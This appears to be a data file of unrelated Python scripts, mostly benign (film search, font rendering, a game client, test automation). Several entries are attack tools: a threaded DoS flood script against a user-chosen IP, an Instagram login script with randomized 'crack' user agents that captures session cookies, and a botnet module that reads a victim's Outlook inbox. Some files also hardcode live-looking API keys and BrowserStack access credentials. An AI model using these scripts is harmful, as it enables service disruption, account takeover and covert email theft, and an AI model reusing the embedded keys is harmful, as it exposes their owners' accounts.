user_num:\n\t\t\tfilm.pop(\"number\")\n\t\t\tuser_film_search_dict = film\n\t\t\tresult_display(user_film_search_dict)\n\n\ndef result_display(user_film_search_dict):\n\tprint(separator, \"Here is info about film:\\n\", sep=\"\\n\")\n\tfor key in user_film_search_dict:\n\t\tprint(f\"\\t{key}:\\t{user_film_search_dict.get(key)}\")\n\n\n# noinspection PyTypeChecker\ndef genre_search():\n\tgenre_dict = {}\n\tprint(\"\\nLook what we have:\")\n\tfor film in films_dict:\n\t\tgenre_json = film[\"gen\"].replace(\"\\'\", \"\\\"\")\t\t# list of genres in json\n\t\tgenre = json.loads(genre_json)\t\t\t\t\t\t\t\t\t# list of genres in python dictionary\n\n\t\tfor list_ in genre:\n\t\t\tif list_[\"genre\"] in genre_dict:\n\t\t\t\tgenre_dict[list_[\"genre\"]].append(film[\"title\"])\n\t\t\telse:\n\t\t\t\tgenre_dict.update({list_[\"genre\"]: [film[\"title\"]]})\n\n\tcounter = 0\n\tgenre_list = []\n\tfor genre in genre_dict:\n\t\tcounter += 1\n\t\tgenre_list = [genre for genre in genre_dict if genre not in genre_list]\n\t\tprint(f\"{counter} \\t {genre} ({len(genre_dict[genre])})\")\n\n\terror_message_genre = \"Please enter a genre number (1 to {}) to get a films list: \"\n\tuser_num = user_number(error_message_genre, len(genre_list))\n\tuser_genre = genre_list[user_num - 1]\n\tprint(separator)\n\tprint(f\"Here is the list of {user_genre} films:\")\n\tfor film in genre_dict.get(user_genre):\n\t\tprint(film)\n\treturn\n\n\ndef user_number(error_message, max_num):\n\twhile True:\n\t\ttry:\n\t\t\tuser_input = int(input(error_message.format(max_num)))\n\t\t\tif user_input < 1 or user_input > max_num:\n\t\t\t\tprint(f\"Please enter a number in range from 1 to {max_num}.\", separator, sep=\"\\n\")\n\t\t\telse:\n\t\t\t\treturn user_input\n\t\texcept ValueError:\n\t\t\tprint(\"Please be enter an integer.\")\n\n\nif __name__ == '__main__':\n\tmain()\n",
    "import http.client\nimport json\nimport csv\nimport argparse\n\ndef get_bin_info(bin_number, verbose=False):\n    if verbose:\n        print(\"Fetching information for BIN number:\", bin_number)\n    conn = http.client.HTTPSConnection(\"neutrinoapi-bin-lookup.p.rapidapi.com\")\n\n    payload = f\"bin-number={bin_number}&customer-ip=60.234.81.148\"\n\n    headers = {\n        'content-type': \"application/x-www-form-urlencoded\",\n        'X-RapidAPI-Key': \"87f0b316e0msh4395b1db710fb7ep19b3ddjsnc06bdf0b304b\",\n        'X-RapidAPI-Host': \"neutrinoapi-bin-lookup.p.rapidapi.com\"\n    }\n\n    conn.request(\"POST\", \"/bin-lookup\", payload, headers)\n\n    res = conn.getresponse()\n    data = res.read()\n\n    return data.decode(\"utf-8\")\n\ndef format_bin_info(bin_info):\n    bin_info_dict = json.loads(bin_info)\n    return bin_info_dict\n\ndef main():\n    parser = argparse.ArgumentParser(description='LightBIN - A BIN lookup tool')\n    parser.add_argument('-b', '--bin', type=str, required=True, help='Single BIN number to get information')\n    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')\n    parser.add_argument('-o', '--output', choices=['json', 'csv'], help='Output format (JSON or CSV)')\n    args = parser.parse_args()\n\n    bin_info = get_bin_info(args.bin, args.verbose)\n    formatted_info = format_bin_info(bin_info)\n\n    if args.output == 'json':\n        print(json.dumps(formatted_info, indent=4))\n        with open(f'{args.bin}.json', 'w') as json_file:\n            json.dump(formatted_info, json_file, indent=4)\n    elif args.output == 'csv':\n        with open(f'{args.bin}.csv', 'w', newline='') as csvfile:\n            writer = csv.writer(csvfile)\n            writer.writerow(['Attribute', 'Value'])\n            for key, value in formatted_info.items():\n                writer.writerow([key, value])\n        print(f\"Information saved in {args.bin}.csv\")\n    else:\n        print(f\"BIN Number: {args.bin}\")\n        for key, value in formatted_info.items():\n            print(f\"{key}: {value}\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "# welcom to hidden hackers (harshaD3) dos & ddos in python script....!\r\n\r\n# It is a very dangerous tool be careful while using this tool.....!\r\n\r\n# Used only for educational purpose and we are not encouraging any illegal things....!\r\n\r\nimport socket\r\nimport threading\r\n\r\ntarget = input(\"Insert target\u2019s IP: \")\r\nport = int(input(\"Insert Port: \"))\r\nnum_threads = int(input(\"Insert number of Threads: \"))\r\nfake_ip = '44.197.175.168'\r\nattack_num = 0\r\n\r\ndef attack():\r\n    global attack_num\r\n    while True:\r\n        try:\r\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            s.connect((target, port))\r\n            s.send(f\"GET /{target} HTTP/1.1\\r\\n\".encode('utf-8'))\r\n            s.send(f\"Host: {fake_ip}\\r\\n\\r\\n\".encode('utf-8'))\r\n            s.close()\r\n            attack_num += 1\r\n            print(f\"Attack number: {attack_num}\")\r\n        except Exception as e:\r\n            print(f\"Error: {e}\")\r\n\r\n# Create threads\r\nthreads = []\r\nfor _ in range(num_threads):\r\n    thread = threading.Thread(target=attack)\r\n    thread.start()\r\n    threads.append(thread)\r\n\r\n# Wait for all threads to finish\r\nfor thread in threads:\r\n    thread.join()\r\n    \r\n# tool developed by @(haesha vaedha raju yerra)...!",
    "# // Please use this script specifically for learning.\r\n# // If you misuse it, it is your right.\r\n# // I am not responsible for your detrimental actionsimport requests\r\nimport os\r\nimport random\r\nimport json\r\nimport time\r\nfrom rich import print as prints\r\nfrom bs4 import BeautifulSoup\r\nfrom rich.panel import Panel as Panel\r\nfrom rich.tree import Tree\r\nfrom rich.table import Table as lipat\r\nfrom rich.console import Console as solsapatu\r\nfrom rich.columns import Columns as coli , Columns\r\n\r\nconsole = solsapatu()\r\nugen = []\r\nAgus = []\r\n# ------ [ warna dasar ] ------ #\r\nB = '\\x1b[1;94m' # BIRU\r\nU = '\\x1b[1;95m' # UNGU\r\nO = '\\x1b[1;96m' # BIRU MUDA\r\nN = '\\x1b[0m' # WARNA MATI\r\nH = \"\\033[0;92m\" # HIJAU\r\nK = \"\\033[0;93m\" #KUNING\r\nM = '\\x1b[1;91m' # MERAH\r\nP = \"\\033[0m\" # PUTIH\r\n\r\n#------------------[ WARNA FOR RICH ]-------------------#\r\nZ2 = \"[#000000]\" # HITAM\r\nM2 = \"[#FF0000]\" # MERAH\r\nH2 = \"[#00FF00]\" # HIJAU\r\nK2 = \"[#FFFF00]\" # KUNING\r\nB2 = \"[#00C8FF]\" # BIRU\r\nU2 = \"[#AF00FF]\" # UNGU\r\nN2 = \"[#FF00FF]\" # PINK\r\nO2 = \"[#00FFFF]\" # BIRU MUDA\r\nP2 = \"[#FFFFFF]\" # PUTIH\r\nJ2 = \"[#FF8F00]\" # JINGGA\r\nA2 = \"[#AAAAAA]\" # ABU-ABU\r\n\r\n#------------------[ RANDOM COLOR RICH ]-------------------#\r\nL1 = \"[#875f5f]\" # LIGHT\r\nG1  = \"[#ffd700]\" # GOLD\r\nM1  = \"[#875fd7]\" # MEDIUM GREEN\r\nP1   = \"[#FF00FF]\" # PINK\r\nW1  = \"[#FFFFFF]\" # WHITE\r\nS1   = \"[#87afff]\" # SKY BLUE\r\nO1   = \"[#d78700]\" # ORANGE3\r\nO3   = \"[#ff5fff]\" # MEDIUM ORCH3\r\n\r\n\r\nfor x in range(1000):\r\n    rr = random.randint\r\n    rc = random.choice\r\n    uacrack1 = f\"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX2101 Build/RKQ1.{str(rr(111111,211111))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36\"\r\n    uacrack2 = f\"Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5000,5500))}.{str(rr(75,99))} Mobile Safari/537.36\"\r\n    uacrack3 = f\"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.{str(rr(3200,3500))}.84 Mobile Safari/537.36\"\r\n    uacrack4 = f\"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(9,16))}_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1\"\r\n    uacrack5 = f\"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,5900))}.{str(rr(75,150))} Mobile Safari/537.36\"\r\n    uacrack6 = f\"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; LEGEND MAX Build/RP1A.{str(rr(111111,210000))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3500,4000))}.{str(rr(75,150))} UCBrowser/{str(rr(10,20))}.4.0.{str(rr(1300,1500))} Mobile Safari/537.36\"\r\n    uacrack7 = f\"Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,99))}.0.{str(rr(4500,4900))}.{str(rr(75,99))} Mobile Safari/537.36\"\r\n    uanyancek= random.choice([uacrack1, uacrack2, uacrack3, uacrack4, uacrack5, uacrack6, uacrack7])\r\n    ugen.append(uanyancek)\r\n\r\ndef namapw():\r\n    print('')\r\n    idf = input(f\"+_ masukan username : \")\r\n    pas = input(f\"+_ masukan password : \")\r\n    time.sleep(1)\r\n    ts = {{int(time.time())}}\r\n    p = session.get(\"https://www.instagram.com/accounts/login/\")\r\n    heade = {\r\n        'Host': 'www.instagram.com',\r\n        'X-IG-App-ID': '1217981644879628',\r\n        'X-IG-WWW-Claim': '0',\r\n        'sec-ch-ua-mobile': '?1',\r\n        'X-Instagram-AJAX': 'e776ba0cb975',\r\n        'Content-Type': 'application/x-www-form-urlencoded',\r\n        'Accept': '*/*',\r\n        'X-Requested-With': 'XMLHttpRequest',\r\n        'X-ASBD-ID': '198387',\r\n        'User-Agent': UA1,\r\n        'X-CSRFToken': p.cookies['csrftoken'],\r\n        'Origin': 'https://z-p42.www.instagram.com',\r\n        'Sec-Fetch-Site': 'same-origin',\r\n        'Sec-Fetch-Mode': 'cors',\r\n        'Sec-Fetch-Dest': 'empty',\r\n        'Referer': 'https://z-p42.www.instagram.com/accounts/onetap/',\r\n        'Accept-Encoding': 'gzip, deflate, br',\r\n        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'\r\n    }\r\n    data = {\r\n        \"enc_password\": f\"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pas}\",\r\n        \"username\": idf,\r\n        \"queryParams\": \"{}\",\r\n        \"optIntoOneTap\": 'false',\r\n        \"stopDeletionNonce\": \"\",\r\n        \"trustedDeviceRecords\": \"{}\"\r\n    }\r\n    response = session.post(\"https://www.instagram.com/accounts/login/ajax\",\r\n                            headers=heade,\r\n                            data=data).text\r\n    if \"userld\" in response or \"sessionid\" in session.cookies.get_dict():\r\n        koki = (\";\").join(\r\n            [ku + \"=\" + asu for ku, asu in session.cookies.get_dict().items()])\r\n        Meledak = Tree(Panel.fit(f\"[bold green]Nama instagram : {idf}\"))\r\n        Meledak.add(Panel.fit(f\"[bold green]password instagram : {pas}\"))\r\n       ",
    "\"\"\"\nSource: http://code.activestate.com/recipes/578225-linux-ioctl-numbers-in-python/\nLinux ioctl numbers made easy\nsize can be an integer or format string compatible with struct module\nfor example include/linux/watchdog.h:\n#define WATCHDOG_IOCTL_BASE     'W'\nstruct watchdog_info {\n        __u32 options;          /* Options the card/driver supports */\n        __u32 firmware_version; /* Firmware version of the card */\n        __u8  identity[32];     /* Identity of the board */\n};\n#define WDIOC_GETSUPPORT  _IOR(WATCHDOG_IOCTL_BASE, 0, struct watchdog_info)\nbecomes:\nWDIOC_GETSUPPORT = _IOR(ord('W'), 0, \"=II32s\")\n\"\"\"\n\nimport struct\n# constant for linux portability\n_IOC_NRBITS = 8\n_IOC_TYPEBITS = 8\n\n# architecture specific\n_IOC_SIZEBITS = 14\n_IOC_DIRBITS = 2\n\n_IOC_NRMASK = (1 << _IOC_NRBITS) - 1\n_IOC_TYPEMASK = (1 << _IOC_TYPEBITS) - 1\n_IOC_SIZEMASK = (1 << _IOC_SIZEBITS) - 1\n_IOC_DIRMASK = (1 << _IOC_DIRBITS) - 1\n\n_IOC_NRSHIFT = 0\n_IOC_TYPESHIFT = _IOC_NRSHIFT + _IOC_NRBITS\n_IOC_SIZESHIFT = _IOC_TYPESHIFT + _IOC_TYPEBITS\n_IOC_DIRSHIFT = _IOC_SIZESHIFT + _IOC_SIZEBITS\n\n_IOC_NONE = 0\n_IOC_WRITE = 1\n_IOC_READ = 2\n\n\ndef _IOC(dir, type, nr, size):\n    # in Python3, unicode -> str; str -> bytes\n    if isinstance(size, bytes) or isinstance(size, str):\n        size = struct.calcsize(size)\n    return dir  << _IOC_DIRSHIFT  | \\\n           type << _IOC_TYPESHIFT | \\\n           nr   << _IOC_NRSHIFT   | \\\n           size << _IOC_SIZESHIFT\n\n\ndef _IO(type, nr): return _IOC(_IOC_NONE, type, nr, 0)\ndef _IOR(type, nr, size): return _IOC(_IOC_READ, type, nr, size)\ndef _IOW(type, nr, size): return _IOC(_IOC_WRITE, type, nr, size)\ndef _IOWR(type, nr, size): return _IOC(_IOC_READ | _IOC_WRITE, type, nr, size)\n",
    "import gc\nfrom pathlib import Path\n\nimport wandb\nfrom tqdm import tqdm\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\nimport transformers\nimport torch\n\nfrom NERLLaMA.src.common.constants import (\n    LLAMA_MODELS,\n    LLAMA_CHAT_MODELS,\n    AUTH_TOKEN_REQUIREMENT_ERROR,\n)\nfrom NERLLaMA.src.fine_tuned.llama2_chat import batch\nfrom NERLLaMA.src.schemas.DataStruct import create_train_test_instruct_datasets\n\n\ndef generate(model, sources, generation_config):\n    model_name = model\n    if model is None:\n        model_name = \"mistralai/Mistral-7B-Instruct-v0.2\"\n\n    model = AutoModelForCausalLM.from_pretrained(model_name)\n    tokenizer = AutoTokenizer.from_pretrained(model_name)\n\n    if torch.cuda.device_count() > 1:\n        model.is_parallelizable = True\n        model.model_parallel = True\n\n    max_instances = -1\n    _, test_dataset = create_train_test_instruct_datasets(\n        \"../src/data/annotated_nlm.json\"\n    )\n    if max_instances != -1 and max_instances < len(test_dataset):\n        test_dataset = test_dataset[:max_instances]\n\n    extracted_list = []\n    target_list = []\n    instruction_ids = []\n    sources = []\n    input_text = []\n\n    # exit(0)\n    # test_dataset = dataset\n    for instruction in tqdm(test_dataset):\n        target_list.append(instruction[\"raw_entities\"])\n        instruction_ids.append(instruction[\"id\"])\n        sources.append(instruction[\"source\"])\n        input_text.append(instruction[\"input\"])\n\n    target_list = list(batch(target_list, n=1))\n    instruction_ids = list(batch(instruction_ids, n=1))\n    input_text = list(batch(input_text, n=1))\n    for source in tqdm(input_text):\n        with torch.no_grad():\n            torch.cuda.empty_cache()\n            gc.collect()\n            messages = [\n                {\"role\": \"user\", \"content\": \"What is your favourite condiment?\"},\n                {\n                    \"role\": \"assistant\",\n                    \"content\": \"Well, I'm quite partial to a good squeeze of fresh lemon juice. It adds just the right amount of zesty flavour to whatever I'm cooking up in the kitchen!\",\n                },\n                {\"role\": \"user\", \"content\": \"Do you have mayonnaise recipes?\"},\n            ]\n\n            encodeds = tokenizer.apply_chat_template(messages, return_tensors=\"pt\")\n\n            model_inputs = encodeds.to(\"cuda\")\n            model.to(\"cuda\")\n\n            generated_ids = model.generate(\n                model_inputs, max_new_tokens=1000, do_sample=True\n            )\n            decoded = tokenizer.batch_decode(generated_ids)\n            print(decoded[0])\n        # for s in generation_output.sequences:\n        #     string_output = tokenizer.decode(s, skip_special_tokens=True)\n        #     extracted_list.append(string_output)\n        #     print(\"Response: \", string_output)\n\n\ndef run(\n    model_name=None,\n    text=None,\n    inputFile=None,\n    max_new_tokens=256,\n    auth_token=None,\n):\n    if not model_name or model_name not in LLAMA_CHAT_MODELS:\n        raise Exception(f\"Invalid model. Model: {model_name}\")\n    if not auth_token:\n        raise Exception(f\"Invalid/Empty Auth Token. {AUTH_TOKEN_REQUIREMENT_ERROR}\")\n    if not inputFile or not Path(inputFile).exists():\n        raise Exception(f\"Invalid/Empty Dataset file. File: {inputFile}\")\n\n    if model_name is None:\n        model_name = \"mistralai/Mistral-7B-Instruct-v0.2\"\n\n    try:\n        generate(model_name, text, max_new_tokens)\n    except:\n        generate(model_name, text, max_new_tokens)\n",
    "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n'Outlook Email (Build Your Own Botnet)'\n\n# standard library\nimport sys\nimport time\nimport json\nimport threading\n\n# packages\nif sys.platform == 'win32':\n    import pythoncom\n    import win32com.client\n\n# utilities\nimport util\n\n# globals\npackages = ['win32com.client','pythoncom']\nplatforms = ['win32']\nresults = {}\nusage = 'outlook <get/count/search/upload>'\ndescription = \"\"\"\nInteract with the Outlook email client application on the client host machine\n\"\"\"\n\n# main\ndef _get_emails():\n    pythoncom.CoInitialize()\n    outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')\n    inbox   = outlook.GetDefaultFolder(6)\n    unread  = inbox.Items\n    while True:\n        email = None\n        try:\n            email = unread.GetNext()\n        except:\n            break\n        if email:\n            sender   = email.SenderEmailAddress.encode('ascii','ignore')\n            message  = email.Body.encode('ascii','ignore')[:100] + '...'\n            subject  = email.Subject.encode('ascii','ignore')\n            received = str(email.ReceivedTime).replace('/','-').replace('\\\\','')\n            globals()['results'][received] = {'from': sender, 'subject': subject, 'message': message}\n        else:\n            break\n\ndef installed():\n    \"\"\"\n    Check if Outlook is installed on the host machine\n    \"\"\"\n    try:\n        pythoncom.CoInitialize()\n        outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')\n        return True\n    except:\n        return False\n\ndef search(s):\n    \"\"\"\n    Search the emails in the Outlook inbox\n    \"\"\"\n    pythoncom.CoInitialize()\n    outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')\n    inbox   = outlook.GetDefaultFolder(6)\n    emails  = util.emails(inbox.Items)\n    for k,v in emails.items():\n        if s not in v.get('message') and s not in v.get('subject') and s not in v.get('from'):\n            emails.pop(k,v)\n    return json.dumps(emails, indent=2)\n\ndef count():\n    \"\"\"\n    Count unread emails in Outlook inbox\n    \"\"\"\n    if len(globals()['results']):\n        result = len(globals()['results'])\n    else:\n        pythoncom.CoInitialize()\n        outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')\n        inbox = outlook.GetDefaultFolder(6)\n        result = len(inbox.Items)\n    return \"Emails in Outlook inbox: {}\".format(result)\n\ndef run():\n    \"\"\"\n    Run the Outlook email module\n\n    \"\"\"\n    t = threading.Thread(target=_get_emails, name=time.time())\n    t.setDaemon(True)\n    t.run()\n    return t\n",
    "print(\"\\033[34m\", \"Welcome to your adventure story simulator!\", \"\\033[37m\")\nprint(\n    \"First, I am going to ask you some questions to personalise this story for you.\"\n)\nprint()\nprint(\"\\033[32m\")\nuserName = input(\"What is your name?: \")\nprint(\"\\033[31m\")\nworstEnemy = input(\"Who is your worst enemy?: \")\nprint(\"\\033[33m\")\nfavouriteFood = input(\"What is your favourite food?: \")\nprint(\"\\033[35m\")\nsuperPower = input(\"What is your super power?: \")\nprint(\"\\033[36m\")\nbestFriend = input(\"What is your best friend's name?: \")\nprint(\"\\033[37m\")\nprint()\nprint(\"It is a beautiful, sunny morning. Our hero,\", \"\\033[32m\", userName,\n      \"\\033[37m\", \",is at home with their bestfriend,\", \"\\033[36m\", bestFriend,\n      \"\\033[37m\", \" ,eating\", \"\\033[33m\", favouriteFood, \"\\033[37m\", \".\")\nprint(\"Just then,\", \"\\033[31m\", worstEnemy, \"\\033[37m\", \"shows up.\")\nprint(\"'Why can't you just leave us alone,\", \"\\033[31m\", worstEnemy, \"'\",\n      \"\\033[36m\", bestFriend, \"\\033[37m\", \"grumbles.\")\nprint(\"'Don't worry,\", \"\\033[36m\", bestFriend, \"\\033[37m\", \"'\", \"\\033[32m\",\n      userName, \"\\033[37m\", \"replies.\", \"\\033[31m\", worstEnemy, \"\\033[37m\",\n      \"must have forgotten that\", \"\\033[32\", \"our hero has the power of\",\n      \"\\033[35m\", superPower, \"\\033[37m\", \"!\")\nprint(\"Bammm! After a short, 5 minute battle,\", \"\\033[31m\", worstEnemy,\n      \"\\033[37m\", \"has been defeated!\")\nprint(\"Finally,\", \"\\033[32m\", userName, \"\\033[37m\", \"and\", \"\\033[36m\",\n      bestFriend, \"\\033[37m\", \"can go back to eating their\", \"\\033[33m\",\n      favouriteFood, \"\\033[37m\", \".\")\nprint(\"\\033[34m\", \"THE END\")\n",
    "from fontTools.ttLib import TTFont\nimport os\nfrom PIL import Image, ImageDraw, ImageFont\n\nFONT_SIZE = 175\n\ndef get_codepoints(font_path):\n    \"\"\"\n    Finds Unicode codepoints supported by a font file \n    and returns them as a set to avoid duplication\n    \"\"\"\n    font = TTFont(font_path)\n    codepoints = []\n\n    for table in font['cmap'].tables:\n        if table.isUnicode():\n            codepoints.extend(table.cmap.keys())\n\n    return sorted(set(codepoints))\n\ndef draw_codepoint(codepoint, font_object, font_name):\n    \"\"\"\n    Creates image of codepoint in a given \n    font and saves it to relevant directory\n    \"\"\"\n    image = Image.new('RGB', (256, 256), 'white')\n    draw = ImageDraw.Draw(image)\n\n    character = chr(codepoint)\n    left, _top, right, _bottom = draw.textbbox(\n                (0,0),\n                character,\n                font_object,\n                font_size=FONT_SIZE\n            )\n\n    text_x = (256 - (right - left)) / 2\n\n    draw.text((text_x, 0), character, fill='black', font=font)\n\n    directory = f'image_data/{format(codepoint, \"04x\")}'\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n    filename = f'{directory}/{font_name}.png'\n\n    image.save(filename)\n\ndef enumerate_files(directory):\n    file_paths = []  # List to store file paths\n    for root, dirs, files in os.walk(directory):\n        for file in files:\n            file_path = os.path.join(root, file)  \n            file_paths.append(file_path)\n    return file_paths\n\nif __name__ == '__main__':\n\n    fontdir = 'Ubuntu/'\n    \n    print(f'Font name: {fontdir.split(\"/\")[0]}')\n\n    paths = enumerate_files(fontdir)\n\n    print(f'Found {paths} fonts')\n    \n    for path in enumerate_files(fontdir):\n        fname = path.split('/')[-1]\n\n        try:\n            font = ImageFont.truetype(\n                        font=path,\n                        size=FONT_SIZE,\n                        index=0,\n                        encoding='unic'\n                    )\n        except:\n            print(f'Error parsing {fname}')\n            continue\n\n        print(f'Font: {fname}')\n\n        try:\n            codepoints = get_codepoints(path)\n        except:\n            print(f'Error parsing {fname}')\n            continue\n\n        print(f'Found {len(codepoints)} codepoints for font {fname}')\n        \n        print(\"Saving images to directory ~/image_data/\")\n\n        ctr = 0\n        for codepoint in codepoints:\n            unicp = format(codepoint, \"04x\")\n            draw_codepoint(codepoint, font, fname.split('.')[0])\n            ctr += 1\n        print(f'Finished saving {ctr} images\\n')\n",
    "import csv\r\nimport requests\r\nimport os\r\n\r\n\r\nclass crawler:\r\n    def __init__(self, appKey):\r\n        self.appKey = appKey\r\n\r\n    def save_data(self, data):\r\n        with open('./\u9ad8\u8003\u5fd7\u613f1.csv', encoding='UTF-8', mode='a+', newline='') as f:\r\n            f_csv = csv.writer(f)\r\n            f_csv.writerow(data)\r\n        f.close()\r\n\r\n\r\n    def get_data(self):\r\n        # \u6dfb\u52a0\u8868\u5934\r\n\r\n        head = ['\u7701\u4efd', '\u5e74\u4efd', '\u5b66\u6821\u540d\u79f0', '\u4e13\u4e1a', '\u6700\u4f4e\u5f55\u53d6\u5206', '\u6700\u4f4e\u5f55\u53d6\u540d\u6b21', '\u9009\u8bfe\u8981\u6c42']\r\n        # \u6e05\u9664\u5df2\u5b58\u5728\u7684\u540c\u540d\u6587\u4ef6\r\n        v_file = '\u9ad8\u8003\u5fd7\u613f1.csv'\r\n        if os.path.exists(v_file):\r\n            os.remove(v_file)\r\n            print('\u9ad8\u8003\u5fd7\u613f\u5b58\u5728\uff0c\u5df2\u6e05\u9664:{}'.format(v_file))\r\n\r\n        with open('./\u9ad8\u8003\u5fd7\u613f1.csv', encoding='utf-8-sig', mode='w', newline='') as f:\r\n            f_csv = csv.writer(f)\r\n            f_csv.writerow(head)\r\n            f.close()\r\n\r\n        url = 'https://www.ayshuju.com/data/edu/specialline'\r\n        headers = {\"content-type\": \"application/json;charset=UTF-8\"}\r\n\r\n        param = {\"appKey\": self.appKey, \"schoolName\": \"\u534e\u4e2d\u5e08\u8303\u5927\u5b66\", \"provinceName\": \"\u6d59\u6c5f\", \"pageNo\": 1, \"pageSize\": 50}\r\n\r\n        for m in range(2017, 2024):\r\n            param['year'] = str(m)\r\n            try:\r\n                response = requests.post(url, json=param, headers=headers)\r\n                response.raise_for_status()     # \u8c03\u7528 response.raise_for_status() \u65b9\u6cd5\u6765\u786e\u4fdd\u8bf7\u6c42\u7684\u6210\u529f\u5b8c\u6210\uff0c\u4ee5\u53ca\u5728\u8bf7\u6c42\u5931\u8d25\u65f6\u53ca\u65f6\u5904\u7406\u5f02\u5e38\u60c5\u51b5\uff0c\u4f8b\u5982\u8bb0\u5f55\u65e5\u5fd7\u3001\u91cd\u65b0\u5c1d\u8bd5\u8bf7\u6c42\u6216\u91c7\u53d6\u5176\u4ed6\u5fc5\u8981\u7684\u63aa\u65bd\u3002\r\n                data = response.json()['result']['records']\r\n                print(data)\r\n                for item in data:\r\n                    # record = (item['provinceName'], item['year'], item['schoolName'],\r\n                    #           item['min'], item['batchName'], item['zslxName'],\r\n                    #           item['minSection'], item['sgName'], item['sgInfo'],\r\n                    #          item['average'], item['spName'])\r\n                    record = (item['provinceName'], item['year'], item['schoolName'],\r\n                              item['spName'], item['min'], item['minSection'])\r\n\r\n                    self.save_data(record)\r\n            except Exception as e:\r\n                print(f'An error occurred: {e}')\r\n\r\n\r\nif __name__ == '__main__':\r\n    appKey = 'U8L47j0v'\r\n    my_crawler = crawler(appKey)\r\n    my_crawler.get_data()\r\n",
    "import socket\r\nimport pickle\r\nfrom game_config import SERVER, PORT\r\n\r\nclass Network:\r\n    \"\"\"\r\n    A class to handle network communication with the server.\r\n\r\n    Attributes:\r\n        server (str): The IP address of the server.\r\n        port (int): The port number for communication.\r\n        addr (tuple): A tuple containing the server IP address and port number.\r\n        client (socket.socket): The client socket object.\r\n        player (str): The unique identifier received upon connection.\r\n    \"\"\"\r\n\r\n    def __init__(self, server=SERVER, port=PORT):\r\n        \"\"\"\r\n        Initializes the Network object with the server address and port.\r\n\r\n        Args:\r\n            server (str): The IP address of the server. Defaults to the value in game_config.\r\n            port (int): The port number for communication. Defaults to 5555.\r\n        \"\"\"\r\n        self.server = server\r\n        self.port = port\r\n        self.addr = (self.server, self.port)\r\n        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        self.player = self.connect()\r\n\r\n    def getPlayer(self):\r\n        return self.player\r\n\r\n    def connect(self):\r\n        \"\"\"\r\n        Connects to the server and receives a unique identifier upon successful connection.\r\n\r\n        Returns:\r\n            str: The unique identifier received from the server.\r\n        \"\"\"\r\n        try:\r\n            self.client.connect(self.addr)\r\n            return pickle.loads(self.client.recv(2048))\r\n        except Exception as e:\r\n            print(\"Error connecting to the server:\", e)\r\n            return None\r\n\r\n    def send(self, data):\r\n        \"\"\"\r\n        Sends data to the server and receives a response.\r\n\r\n        Args:\r\n            data (str): The data to be sent to the server.\r\n\r\n        Returns:\r\n            str: The response received from the server.\r\n        \"\"\"\r\n        try:\r\n            self.client.send(pickle.dumps(data))\r\n            return pickle.loads(self.client.recv(2048))\r\n        except Exception as e:\r\n            print(\"Error sending data:\", e)\r\n            return None\r\n\r\n    def disconnect(self):\r\n        \"\"\"\r\n        Disconnects from the server.\r\n        \"\"\"\r\n        try:\r\n            self.client.close()\r\n        except Exception as e:\r\n            print(\"Error disconnecting from the server:\", e)\r\n",
    "import os\nfrom datetime import datetime\nimport sys\nimport HtmlTestRunner\nfrom urllib.parse import urlparse, parse_qs, urlunparse\nfrom appium.options.android import UiAutomator2Options\nfrom browserstack.local import Local  # Aseg\u00farate de tener esta importaci\u00f3n\n\n# Set your BrowserStack access credentials here\nuserName = \"josedanielpereze_I5UKfk\"\naccessKey = \"hPB87qTygSSwRpUuGdzg\"\n# Importaciones de Page\nfrom SRC.PageObjects.pagePublic import PagePublic\nfrom SRC.PageObjects.pageLogin import PageLogin\nfrom SRC.PageObjects.pageAsistenciainternacional import PageAsistenciainternacional\n\n# Importaciones Modulos\nfrom appium import webdriver\nimport unittest\nimport json\nimport time\n\nsys.path.append(r\"/\\\\\")\noptions = UiAutomator2Options().load_capabilities({\n    \"app\": \"bs://b32ae9a6ee508e70fd302a29a01405ada5e6c97c\",\n    \"deviceName\": \"Samsung Galaxy S21\",\n    \"platformName\": \"android\",\n    \"platformVersion\": \"12.0\",\n    \"bstack:options\": {\n        \"userName\": userName,\n        \"accessKey\": accessKey,\n        \"projectName\": \"APP-MEDIFE\",\n        \"buildName\": \"TEST-APP-MEDIFE-asistencia_internacional\",\n        \"sessionName\": \"BStack local_test_asistencia_internacional\",\n        \"local\": \"true\"\n    }\n})\n\n\nclass TCAsistenciainternacional(unittest.TestCase):\n    bs_local = None\n\n    @classmethod\n    def setUpClass(cls):\n        print(\"Iniciando el cliente Local de BrowserStack...\")\n        cls.bs_local = Local()\n        bs_local_args = {\"key\": accessKey, \"forcelocal\": \"true\"}\n        cls.bs_local.start(**bs_local_args)\n\n    @classmethod\n    def tearDownClass(cls):\n        print(\"Deteniendo el cliente Local de 